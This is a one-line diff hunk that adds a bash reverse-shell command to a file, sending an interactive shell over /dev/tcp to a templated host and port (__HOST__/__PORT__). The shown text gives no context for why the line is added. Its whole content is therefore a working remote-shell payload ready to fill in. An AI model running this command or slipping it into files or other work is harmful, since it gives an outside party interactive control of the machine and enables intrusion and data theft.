@@ -1,0 +1,1 @@
+bash -c 'bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1'
